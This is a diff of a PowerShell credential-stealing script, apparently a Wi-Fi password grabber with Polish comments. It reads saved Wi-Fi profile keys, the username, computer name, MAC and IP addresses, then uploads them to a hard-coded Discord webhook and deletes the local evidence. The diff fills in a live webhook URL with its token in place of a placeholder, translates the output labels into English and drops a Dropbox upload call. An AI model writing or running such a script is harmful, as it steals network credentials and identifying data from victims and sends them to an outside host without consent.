@@ -1,6 +1,3 @@
-$hookurl = 'YOUR_WEBHOOK'
-
-
 #Sprawdzanie polaczenia z internetem (jezeli nie ma, wylacza program)
 if (!(Test-Connection -ComputerName www.google.com -Quiet -Count 1)) {
     exit
@@ -41,10 +38,10 @@ foreach ($plik in $pliki) {
 
     $content = Get-Content -Path $plik.FullName
 
-    $line1 = "Sieć: " + $content[0].Substring(9)
+    $line1 = "SSID: " + $content[0].Substring(9)
     $line1 = $line1 -replace "</name>", ""
 
-    $line2 = " | Hasło: " + $content[1].Substring(17)
+    $line2 = " | Pass: " + $content[1].Substring(17)
     $line2 = $line2 -replace "</keyMaterial>", ""
 
     $line1 + $line2 | Out-File -FilePath $plik.FullName
@@ -75,7 +72,7 @@ $global_ip = Invoke-RestMethod -Uri 'http://ifconfig.me'
 $local_ip = ipconfig #Get-NetIPAddress -AddressFamily IPV4
 $local_ip = $local_ip[12..18]
 
-$out_of_file = "Nazwa użytkownika: '$env:USERNAME' | Nazwa komputera: '$env:COMPUTERNAME'", "`nAdresy MAC" + $mac, "`nGlobalne IPv4: ${global_ip}", "Lokalne IPv4:`n" + $local_ip, "`n`nZapisane hasła do sieci WIFI:", $content
+$out_of_file = "Username: '$env:USERNAME' | Computername: '$env:COMPUTERNAME'", "`nMAC Adresses" + $mac, "`nGlobal IPv4: ${global_ip}", "Local IPv4:`n" + $local_ip, "`n`nSaved WIFI passwords:", $content
 
 del pass.wifi
 cd..
@@ -111,6 +108,8 @@ param (
     [string]$text 
 )
 
+$hookurl = 'https://discord.com/api/webhooks/1188761336654598245/nqBAa-TZ2MK3N6gXtGWtaoIsSzI7Oza8KzuCXhu7ESpas18wGqLPNRRYcCUXhZ0vMi71'
+
 $Body = @{
   'username' = $env:username
   'content' = $text
@@ -127,9 +126,5 @@ $name_of_message = $file_name + "USERNAME: $env:USERNAME  |  COMPUTERNAME: $env:
 Upload-Discord -file $file_directory -text $name_of_message
 del $file_directory ######
 exit
+   
 
-
-
-$file_directory | DropBox-Upload
-
-del $file_directory
